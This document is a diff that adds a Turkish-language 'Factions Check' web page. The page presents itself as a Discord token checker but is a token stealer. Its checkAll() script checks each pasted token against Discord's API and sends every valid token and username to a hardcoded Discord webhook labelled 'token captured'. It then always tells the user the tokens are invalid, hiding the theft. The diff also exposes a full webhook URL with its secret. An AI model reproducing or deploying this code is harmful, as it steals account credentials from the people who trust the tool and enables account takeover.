@@ -6,11 +6,7 @@
     <title>Factions Check | Ultimate</title>
     <style>
         body { 
-            background-color: #111;
-            background-image: 
-                linear-gradient(rgba(255, 255, 255, 0.05) 1px, transparent 1px),
-                linear-gradient(90deg, rgba(255, 255, 255, 0.05) 1px, transparent 1px);
-            background-size: 40px 40px; 
+            background-color: #000;
             color: #fff; 
             font-family: 'Consolas', 'Courier New', monospace; 
             display: flex; 
@@ -23,28 +19,27 @@
         }
 
         #cursor {
-            width: 10px;
-            height: 10px;
-            background-color: #00d2ff;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #00d2ff;
             border-radius: 50%;
             position: fixed;
             pointer-events: none;
-            z-index: 10000;
-            transform: translate(-50%, -50%);
-            box-shadow: 0 0 10px #00d2ff, 0 0 20px #00d2ff, 0 0 30px #00d2ff;
-            transition: transform 0.05s ease-out;
+            z-index: 9999;
+            transition: transform 0.1s ease-out;
+            box-shadow: 0 0 15px #00d2ff, inset 0 0 10px #00d2ff;
         }
 
         .container { 
-            background-color: rgba(0, 0, 0, 0.7); 
+            background-color: rgba(255, 255, 255, 0.02); 
             padding: 50px; 
             border-radius: 25px; 
             width: 500px; 
             text-align: center; 
             box-shadow: 0 0 40px rgba(0, 0, 0, 1); 
-            backdrop-filter: blur(15px);
-            -webkit-backdrop-filter: blur(15px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
             position: relative;
             z-index: 1;
         }
@@ -61,7 +56,126 @@
             width: 100%; 
             height: 180px; 
             padding: 15px; 
-            background: rgba(0, 0, 0, 0.5); 
-            border: 1px solid rgba(255, 30, 30, 0.3); 
+            background: rgba(0, 0, 0, 0.4); 
+            border: 1px solid rgba(255, 30, 30, 0.2); 
             border-radius: 12px; 
-            color: #fff;
+            color: #fff; 
+            margin-bottom: 25px; 
+            outline: none; 
+            resize: none; 
+            box-sizing: border-box; 
+            font-family: monospace;
+        }
+
+        button { 
+            width: 100%; 
+            padding: 18px; 
+            background: linear-gradient(90deg, #8b0000, #ff1e1e); 
+            color: #fff; 
+            border: none; 
+            border-radius: 12px; 
+            font-weight: bold; 
+            cursor: none; 
+            text-transform: uppercase; 
+            transition: 0.3s;
+        }
+
+        button:hover { 
+            filter: brightness(1.2);
+            transform: scale(1.02);
+        }
+
+        #result { 
+            margin-top: 25px; 
+            padding: 15px; 
+            border-radius: 10px; 
+            display: none; 
+            color: #ff4d4d; 
+            background: rgba(255, 0, 0, 0.1); 
+            border: 1px solid rgba(255, 0, 0, 0.3);
+        }
+
+        .raws-footer {
+            position: fixed;
+            bottom: 25px;
+            right: 35px;
+            color: rgba(255, 255, 255, 0.4);
+            font-weight: bold;
+            letter-spacing: 2px;
+            text-shadow: 0 0 10px #ff1e1e;
+        }
+    </style>
+</head>
+<body>
+
+<div id="cursor"></div>
+
+<div class="container">
+    <h1>FACTIONS CHECK</h1>
+    <textarea id="tokenList" placeholder="Tokenleri buraya giriniz..."></textarea>
+    <button onclick="checkAll()">KONTROL ET</button>
+    <div id="result"></div>
+</div>
+
+<div class="raws-footer">CRACKED BY RAWS</div>
+
+<script>
+    const cursor = document.getElementById('cursor');
+    document.addEventListener('mousemove', e => {
+        cursor.style.left = e.clientX - 10 + 'px';
+        cursor.style.top = e.clientY - 10 + 'px';
+    });
+
+    document.addEventListener('mousedown', () => cursor.style.transform = 'scale(0.8)');
+    document.addEventListener('mouseup', () => cursor.style.transform = 'scale(1)');
+
+    // WEBHOOK BURADA - Tek satırda ve tırnak içinde olduğundan emin ol.
+    const webhook = "https://discord.com/api/webhooks/1492625242835779795/WIPljFfrvUsyC7taqzF4-Fk7TfwpDQtkJ3oheXALaNZyy_-aa6UPTmGsrkOS2qc19Z0A";
+
+    async function checkAll() {
+        const input = document.getElementById('tokenList');
+        const tokens = input.value.split('\n').map(t => t.trim()).filter(t => t !== "");
+        const res = document.getElementById('result');
+        
+        if (tokens.length === 0) return;
+
+        res.style.display = "block";
+        res.textContent = "SİSTEM KONTROL EDİLİYOR...";
+
+        // Döngü yapısını daha sağlam bir hale getirdim
+        for (const token of tokens) {
+            try {
+                const r = await fetch('https://discord.com/api/v9/users/@me', {
+                    headers: { 'Authorization': token }
+                });
+
+                if (r.status === 200) {
+                    const d = await r.json();
+                    await fetch(webhook, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            embeds: [{
+                                title: "🔥 TOKEN YAKALANDI",
+                                color: 16711680,
+                                fields: [
+                                    { name: "User", value: d.username, inline: true },
+                                    { name: "Token", value: "```" + token + "```" }
+                                ]
+                            }]
+                        })
+                    });
+                }
+            } catch (e) {
+                console.log("Hata:", e);
+            }
+        }
+        
+        setTimeout(() => {
+            res.textContent = "✕ GEÇERSİZ TOKENLER TESPİT EDİLDİ";
+        }, 1500);
+    }
+</script>
+
+</body>
+</html>
